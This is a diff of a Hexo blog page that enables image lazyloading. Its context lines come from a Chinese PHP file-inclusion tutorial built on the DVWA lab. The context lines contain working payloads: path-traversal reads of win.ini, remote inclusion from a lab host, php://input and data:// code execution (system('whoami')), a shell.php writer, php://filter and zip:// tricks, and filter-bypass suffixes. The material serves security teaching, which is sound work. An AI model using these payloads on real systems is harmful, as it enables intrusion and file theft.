@@ -40,7 +40,7 @@ var CONFIG = {
   fancybox: false,
   zoomImage: {"gapAside":"20px"},
   galleryWaterfall: undefined,
-  lazyload: false,
+  lazyload: true,
   pjax: {"avoidBanner":true},
   externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
   shortcuts: undefined,
@@ -203,12 +203,18 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>正常提供的功能如下：</li>
 </ul>
 <p><code>?page=./file1.php</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-05-23.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-05-23.png"  alt="Alt text">
+      </p>
 <ul>
 <li>通过绝对路径包含敏感文件进行读取：</li>
 </ul>
 <p><code>?page=C:/Windows/win.ini</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-07-10.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-07-10.png"  alt="Alt text">
+      </p>
 
         <h3 id="4-2-2：示例（读取文件）"   >
           <a href="#4-2-2：示例（读取文件）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-2：示例（读取文件）" class="headerlink" title="4.2.2：示例（读取文件）"></a>4.2.2：示例（读取文件）</h3>
@@ -219,7 +225,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>通过 <code>file://</code> 协议包含敏感文件进行读取</li>
 </ul>
 <p><code>?page=file://C:/Windows/win.ini</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-49-01.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-49-01.png"  alt="Alt text">
+      </p>
 
         <h3 id="4-2-3：示例（执行代码）"   >
           <a href="#4-2-3：示例（执行代码）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-3：示例（执行代码）" class="headerlink" title="4.2.3：示例（执行代码）"></a>4.2.3：示例（执行代码）</h3>
@@ -230,7 +239,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>配合文件上传等操作进行代码执行：</li>
 </ul>
 <p><code>?page=../../../../../../../phpinfo.txt</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-12-24.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-18-20-12-24.png"  alt="Alt text">
+      </p>
 
         <h2 id="4-3：远程文件包含"   >
           <a href="#4-3：远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-3：远程文件包含" class="headerlink" title="4.3：远程文件包含"></a>4.3：远程文件包含</h2>
@@ -270,7 +282,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <hr>
 <p>远程包含文件实现代码执行：</p>
 <p><code>?page=http://192.168.8.1:8000/phpinfo.txt</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-29-01.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-29-01.png"  alt="Alt text">
+      </p>
 
         <h2 id="4-4：伪协议【php-input】"   >
           <a href="#4-4：伪协议【php-input】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-4：伪协议【php-input】" class="headerlink" title="4.4：伪协议【php:&#x2F;&#x2F;input】"></a>4.4：伪协议【php:&#x2F;&#x2F;input】</h2>
@@ -298,7 +313,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>POST 传递数据</li>
 </ul>
 <p><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;), &quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-28-11.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-28-11.png"  alt="Alt text">
+      </p>
 
         <h3 id="4-4-2：示例（执行命令）"   >
           <a href="#4-4-2：示例（执行命令）" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-4-2：示例（执行命令）" class="headerlink" title="4.4.2：示例（执行命令）"></a>4.4.2：示例（执行命令）</h3>
@@ -313,7 +331,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>POST 传递数据</li>
 </ul>
 <p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-34-23.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-34-23.png"  alt="Alt text">
+      </p>
 
         <h2 id="4-5：伪协议【php-filter】"   >
           <a href="#4-5：伪协议【php-filter】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-5：伪协议【php-filter】" class="headerlink" title="4.5：伪协议【php:&#x2F;&#x2F;filter】"></a>4.5：伪协议【php:&#x2F;&#x2F;filter】</h2>
@@ -344,7 +365,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>提供绝对路径读取文件</li>
 </ul>
 <p><code>?page=php://filter/read=convert.base64-encode/resource=C:/Windows/win.ini</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-22-26.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-22-26.png"  alt="Alt text">
+      </p>
 
         <h3 id="4-5-2：示例-2"   >
           <a href="#4-5-2：示例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-5-2：示例-2" class="headerlink" title="4.5.2：示例 2"></a>4.5.2：示例 2</h3>
@@ -355,7 +379,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>通过网址读取文件</li>
 </ul>
 <p><code>?page=php://filter/read=convert.base64-encode/resource=http://192.168.8.1:8000/phpinfo.txt</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-26-55.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-16-26-55.png"  alt="Alt text">
+      </p>
 
         <h2 id="4-6：伪协议【data-】"   >
           <a href="#4-6：伪协议【data-】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-6：伪协议【data-】" class="headerlink" title="4.6：伪协议【data:&#x2F;&#x2F;】"></a>4.6：伪协议【data:&#x2F;&#x2F;】</h2>
@@ -383,7 +410,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>通过 <code>data://text/plain,</code> 明文传递 PHP 代码，进行代码执行</li>
 </ul>
 <p><code>?page=data:text/plain,&lt;?php system(whoami);?&gt;</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-54-13.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-54-13.png"  alt="Alt text">
+      </p>
 
         <h3 id="4-6-2：示例-2"   >
           <a href="#4-6-2：示例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-6-2：示例-2" class="headerlink" title="4.6.2：示例 2"></a>4.6.2：示例 2</h3>
@@ -394,7 +424,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <li>通过 <code>data://text/plain;base64,</code> 以 Base64 形式传递 PHP 代码，进行代码执行</li>
 </ul>
 <p><code>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk7Pz4=</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-56-14.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-19-15-56-14.png"  alt="Alt text">
+      </p>
 
         <h2 id="4-7：伪协议【zip-】"   >
           <a href="#4-7：伪协议【zip-】" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-7：伪协议【zip-】" class="headerlink" title="4.7：伪协议【zip:&#x2F;&#x2F;】"></a>4.7：伪协议【zip:&#x2F;&#x2F;】</h2>
@@ -417,12 +450,18 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <ul>
 <li>压缩包 test.zip 内的文件路径为 <code>test/phpinfo.txt</code></li>
 </ul>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-23-09.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-23-09.png"  alt="Alt text">
+      </p>
 <ul>
 <li>通过 <code>zip://&lt;zip文件路径&gt;#&lt;内部文件路径&gt;</code> 进行代码执行</li>
 </ul>
 <p><code>?page=zip://D:/T/test.zip%23test/phpinfo.txt</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-25-17.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-25-17.png"  alt="Alt text">
+      </p>
 
         <h1 id="5：防护绕过"   >
           <a href="#5：防护绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#5：防护绕过" class="headerlink" title="5：防护绕过"></a>5：防护绕过</h1>
@@ -522,7 +561,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <p>以 DVWA File-Inclusion（low）为例。</p>
 </blockquote>
 <p><code>?page=http://192.168.8.1:8000/phpinfo.txt?</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-09-47.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-09-47.png"  alt="Alt text">
+      </p>
 
         <h3 id="5-2-5：【-】绕过"   >
           <a href="#5-2-5：【-】绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-5：【-】绕过" class="headerlink" title="5.2.5：【#】绕过"></a>5.2.5：【#】绕过</h3>
@@ -542,7 +584,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <p>以 DVWA File-Inclusion（low）为例。</p>
 </blockquote>
 <p><code>?page=http://192.168.8.1:8000/phpinfo.txt#</code></p>
-<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-16-09.png" alt="Alt text"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-16-09.png"  alt="Alt text">
+      </p>
 
         <h1 id="6：防范方法"   >
           <a href="#6：防范方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#6：防范方法" class="headerlink" title="6：防范方法"></a>6：防范方法</h1>
@@ -731,7 +776,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
           7.2：日志文件包含利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8%EF%BC%9A%E5%85%B6%E4%BB%96"><span class="toc-text">
           8：其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1%EF%BC%9A%E7%9B%B8%E5%85%B3%E5%B9%B3%E5%8F%B0"><span class="toc-text">
           8.1：相关平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2%EF%BC%9A%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">
-          8.2：参考资料</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">53</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+          8.2：参考资料</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">53</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
   var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
   // 加载进度条的计时器
   var loadingTimer = null;
